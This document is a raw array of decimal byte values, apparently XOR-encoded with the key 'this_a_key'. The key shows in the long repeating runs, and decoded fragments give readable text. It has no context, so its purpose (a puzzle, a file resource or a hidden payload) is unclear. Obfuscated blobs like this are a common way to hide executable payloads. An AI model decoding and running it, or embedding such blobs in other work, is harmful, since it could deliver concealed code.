115, 162, 158, 160, 148, 155, 134,   139, 151, 151, 140, 160, 158,  77, 107, 101, 121,   101, 104, 105, 115,  80,  97,  95, 107, 118, 121,   116, 104, 125, 115,  95,  97,  74, 107, 101, 121,   138, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148,  96, 121,    39, 104,  28, 115,  50,  97,  50, 107,   4, 121,     6, 104,  16, 115,  22,  97,  49, 107,   3, 121,    27, 104,  27, 115,  50,  97,  62, 107,  17, 121,    29, 104,   6, 115,  49,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104,  65, 115,  93,  97, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  79,  97,  95, 107,  35, 120,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   117, 104, 105, 115, 161, 158, 160, 148, 102, 121,   116, 104, 109, 115,  95,  97,  90, 107, 101, 121,   114, 104, 105, 115,  88,  97,  95, 107, 109, 121,   116, 104,  96, 115,  95,  97,  85, 107, 101, 121,   127, 104, 105, 115,  83,  97,  95, 107, 104, 121,   116, 104, 103, 115,  95,  97,  80, 107, 101, 121,    98, 104, 105, 115,  78,  97,  95, 107, 119, 121,   116, 104, 122, 115,  95,  97,  75, 107, 101, 121,    97, 104, 105, 115, 161, 158, 160, 148, 114, 121,   116, 104, 113, 115,  95,  97,  70, 107, 101, 121,   110, 104, 105, 115,  68,  97,  95, 107, 121, 121,   116, 104, 116, 115,  95,  97,  65, 107, 101, 121,   107, 104, 105, 115, 127,  97,  95, 107,  68, 121,   116, 104,  75, 115,  95,  97, 124, 107, 101, 121,    80, 104, 105, 115, 122,  97,  95, 107,  67, 121,   116, 104,  78, 115,  95,  97, 119, 107, 101, 121,    93, 104, 105, 115, 117,  97,  95, 107,  78, 121,   116, 104,  69, 115,  95,  97, 114, 107, 101, 121,    90, 104, 105, 115, 112,  97,  95, 107,  85, 121,   116, 104,  88, 115,  95,  97, 161, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 151, 140,  95,  97,  91, 107, 103, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  94, 107, 101, 121,   148, 237, 246, 129, 166,  46,  55, 123, 206, 232,   124, 104,  66,  84, 236, 184, 111, 107, 101, 121,    98, 105, 105, 115,  85,  97,  95, 107,  98, 121,   116, 104, 241, 115,  95,  97,  93, 107, 101, 121,   218, 104, 105, 115,  87,  97,  95, 107, 218, 121,   116, 104, 104, 115,  95,  97, 148, 107, 101, 121,   123, 104, 105, 115, 142,  97,  95, 107, 117, 121,   116, 104, 176, 115,  95,  97,  77, 107, 101, 121,   149, 104, 105, 115,  81,  97,  95, 107, 153, 121,   116, 104,  96, 115,  95,  97,  91, 106, 101, 121,   103, 104, 105, 115,  81,  96,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 119, 115,  95,  97,  81, 107, 101, 121,    55,  82,  53,  61,  48,  19,  50,  10,   9,  87,    16,   7,  29, 115,  65,  97,  95, 107, 108, 121,   116, 104,  58,   6,  61,  65,  18,  42,  44,  55,   116, 118, 105, 115,  95, 101,  95, 107, 101,   0,    29,   6, 105, 113,  95,  97,  95, 143,  97, 122,   116, 104, 105, 115,  95,  97,  95, 104, 101, 121,   116, 104, 105, 115,  95, 127,  95, 107, 101, 106,   116, 104, 105,  62,  54,   2,  45,   4,  22,  22,    18,  28,  73,  36,  48,  19,  59,  75,  83,  87,    68, 104, 106, 115,  95,  97,  95, 107, 101, 121,   106, 104, 105, 115,  93,  97,  95, 107,  83, 121,   119, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  75,  59,  78,  48,    67,  94,  69,  94,  22,  87,  27,  66,   5,  21,    16,  11,  32,  57,  89, 204, 119,  44,  99,  50,    53,  36,  35,  37,  74,  46,  23,  34,  46,  48,    59,  39, 105,  60,  19, 120,  64, 107, 124, 103,    61, 116, 105, 102,  71, 116,  17, 107,  43, 102,    56, 112, 105, 107,  66, 125,  64,  34, 123, 100,    96,  56,  66,  58, 104,  87,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  94,  97, 161, 148, 102, 115,   116, 104, 150, 140, 160, 158,  95,  98, 103, 121,   116, 104, 105, 115, 159,  97,  95, 107, 101, 121,   116,  46, 117, 115,  95,  97,  18,   2,   6,  11,    27,  27,   6,  21,  43,  65,   8,   4,  23,  29,    84,  94,  71,  67, 127,  37,  48,   8,  16,  20,    17,   6,  29, 115,  85,  97,  95, 107,  40,  42,    35,   7,  27,  23,  27,  14,  60, 107, 117, 121,   116, 104,  62,  28,  45,   5, 113,  47,  10,  26,     1,   5,  12,  29,  43,  79, 105, 107, 145,  64,   198,  25, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 181, 214,  55,  97,  26, 171, 108, 125,   116, 104,  92, 115,  58,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 104, 101, 121,    63, 107, 105, 115,  13, 107,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  20,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116,  96, 105, 115, 211,  97,  95, 107, 101, 113,   116, 104, 229, 115,  95,  97, 211,  99, 101, 121,   116, 104, 105, 115, 211, 105,  95, 107, 101, 121,   116, 104, 229, 123,  95,  97,  95, 107, 101, 121,   248,  96, 105, 115,  95,  97,  95, 107, 233, 113,   116, 104, 125, 115,  95,  97, 155,  99, 101, 121,   116, 104, 105, 115, 233, 105,  95, 107, 107, 121,   116, 104, 173, 123,  95,  97,  95, 107, 101, 121,   176,  96, 105, 115,  95,  97,  95, 107, 161, 113,   116, 104, 105, 115,  95,  97, 155,  99, 101, 121,   126, 104, 105, 115, 145, 105,  95, 107, 111, 121,   116, 104, 173, 123,  95,  97,  95, 107, 101, 121,   236,  97, 105, 115,  28,  97,  95, 107, 189, 113,   116, 104, 105, 115,  95,  97, 135,  99, 101, 121,   116, 104, 105, 115, 135, 105,  95, 107, 101, 121,   116, 104, 177, 123,  95,  97,  95, 107, 101, 121,   172,  96, 105, 115,  95,  97,  95, 107, 189, 113,   116, 104, 105, 115,  95,  97, 135,  99, 101, 121,   116, 104, 105, 115, 135, 105,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,    37,  97, 105, 115,  95,  97,  95, 107,  52, 112,   116, 104, 105, 115,  95,  97,  14,  98, 101, 121,   116, 104, 105, 115,  14, 104,  95, 107, 101, 121,   116, 104,  56, 122,  95,  97,  95, 107, 101, 121,    37,  97, 105, 115,  65,  97,  95, 107, 190, 112,   116, 104,  49, 115,  95,  97, 108,  97, 101, 121,   107, 104, 105, 115,  48, 104,  95, 107,  76, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 233, 113,   116, 104, 105, 115,  95,  97, 135,  99, 101, 121,   116, 104, 105, 115,  95,  97,  93, 107, 102, 121,   117, 104, 104, 115, 135, 105,  95, 107, 101, 121,   116, 104, 177, 123,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97, 135,  99, 101, 121,   116, 104, 105, 115, 135, 105,  95, 107, 101, 121,   116, 104,   6, 122,  95,  97,  95, 107, 101, 121,   172,  96, 105, 115,  95,  97,  95, 107, 233, 113,   116, 104, 105, 115,  95,  97, 211,  99, 101, 121,   116, 104, 105, 115, 135, 105,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 189, 113,   116, 104, 105, 115,  95,  97, 135,  99, 101, 121,   116, 104, 105, 115, 135, 105,  95, 107, 101, 121,   116, 104, 177, 123,  95,  97,  95, 107, 101, 121,   172,  96, 105, 115,  95,  97,  95, 107, 233, 113,   116, 104, 105, 115,  95,  97, 135,  99, 101, 121,   116, 104, 105, 115, 211, 105,  95, 107, 101, 121,   116, 104, 177, 123,  95,  97,  95, 107, 101, 121,   107,  97, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115, 255, 105,  95, 107, 109, 121,   116, 104, 193, 123,  95,  97,  81, 107, 101, 121,   248,  96, 105, 115,  95,  97,  95, 107, 233, 113,   116, 104, 105, 115,  95,  97, 211,  99, 101, 121,   116, 104, 105, 115, 211, 105,  95, 107, 101, 121,   116, 104, 177, 123,  95,  97,  95, 107, 101, 121,   107,  97, 105, 115,  95,  97,  95, 107, 189, 113,   116, 104,  46, 115,  95,  97, 135,  99, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,    57,  17,  73,  21,  45,   8,  58,   5,   1,  85,    84,  33,  73,   0,  62,   8,  59,  71,  69,  13,    28,  13,  27,  22, 127,   8,  44,  75,  23,  28,    21,   4,   5,  10, 127,  15,  48,  75,   3,  21,    21,  15,  73,  27,  58,  19,  58,  71,  69,  14,    28,  17,  73,  23,  48,  15, 205,  31,  69,   0,    27,  29,  73,  17,  58,  13,  54,  14,  19,  28,    84,   5,  12,  76,  82,  77, 114,  34,  83,  61,    93,   8,   5,  23,  60,  40,  21, 109,  72,  81,    51,  99,  34,  50,  19,  43,   9, 126,  42,  49,    61,  35,  32,  60,  16,  46,  19, 114, 122,  96,   106,  33, 117, 102,  71, 116,  17,  37, 122,  53,   108, 112, 116, 111,  64,  40,  65, 118, 101, 122,   116, 104,  34, 112,  95,  97, 217, 104, 101, 121,   178, 107, 105, 115,  95, 159, 161, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  93,  30, 100, 122,   116, 107, 105, 115,  20,  98,  95, 107, 155, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 100, 121,   116, 105, 103, 115,  80,  97,  87, 107, 100, 121,    63, 104, 102, 115,  95,  97,  95, 107,  89, 121,   116,  40, 152, 140,  93,  97,  99, 107,  99,  55,    27,  26,   4,  18,  51,  97, 126, 107, 101, 121,   123, 117, 105, 122, 191,  96, 159, 104, 197, 124,   244, 111,   9, 122,  31, 106, 127, 102, 101, 118,   148, 120, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 111, 115,   2,  98,  95,  10, 108, 125,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107,  71, 121,    53,  40, 155, 140, 254,  97, 125, 107, 115,  61,    17,  14,   8,   6,  51,  21, 127,  59,   4,  11,    21,  15,  27,  18,  47,   9, 127,  45,  10,  23,     0, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  20, 107, 101, 121,   119, 104, 150, 140, 160, 158,  92, 107, 154, 134,   139, 151, 104, 115,  91,  65, 160, 148, 100, 121,   116, 104, 105, 115,  20,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107,  46, 121,   116, 104, 105, 112, 159,  64,  56, 105, 101, 122,   116, 104, 175, 112,  95,  97,  93, 107, 101, 122,   116, 104,  34, 112,  95,  97,  92, 107,  34, 121,   119,  17,   0,  29,  84,  34, 101,  55,   3,  72,    64,  15,  71,  23,  48,  21,  92,  18,  12,  23,    68,  43,  83,  47,   8,  40,  17,  37,  49,  37,    36,  26,   6,  21,  54,  13,  58,  24,  57,  56,    16,   5,   0,  29,  54,  18,  43,  25,   4,  13,    27,  26,  53,  55,  58,  18,  52,  31,  10,   9,    40,  14,  88,  71,  56,  79,  59,   4,  17, 134,   117, 105, 105,  38, 114,  97,  95, 107, 101, 134,   139, 104, 105, 115,  95,  33,  95, 107, 101, 127,   116, 104, 105, 245,  92,  97,  95, 123, 108, 121,   112,  14,  88,  71,  56,  96,  95, 122, 100, 121,   116, 104, 109,  53, 110,  85,  24, 107,  37, 120,   244, 105, 105,  76,  95,  97,  95,  84, 101, 121,   116,  96, 105, 114,  95,  96,  95,  84, 101, 121,   116, 104, 105, 115,  95,  94,  95, 107, 101, 120,   113, 104,  60, 242,  60,  89,  95, 105, 121, 121,   116, 104, 105, 115,  95,  97,  21, 107, 101, 121,    63, 104, 105, 115, 111,  97,  95, 104, 101, 121,   117, 104,  89, 115,  21,  98,  95, 107, 101, 121,    55, 104, 124, 101, 207,  96,  95, 107,  49,  16,    25,  13,  26,  83,  17,   4,  40,  75,  55,  22,    25,   9,   7, 115,  83, 119, 207, 106, 103, 121,    39,  17,   4,  17,  48,  13,  95,  96,  67, 233,   117, 104, 105,  50,  45,   8,  62,   7, 101, 104,    65, 248, 104, 115,  95,  34,  48,  30,  23,  16,    17,  26,  73,  61,  58,  22,  95,  73, 101, 125,   116,  89,  97, 251,  71,  97,  95, 187, 103, 121,   116,   0, 104, 115,  95,  97,  95, 207, 233, 238,   179, 192, 229, 228, 152,  97,  95, 107, 101, 127,   116, 107, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 125,   116, 235, 121, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101,  93,   119, 104, 105, 115,  95, 126,  95, 107, 101, 113,    39,  29,  11,  83,  18,  32,  22,  37, 101, 121,   116, 104, 106,  10,  54,  15,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 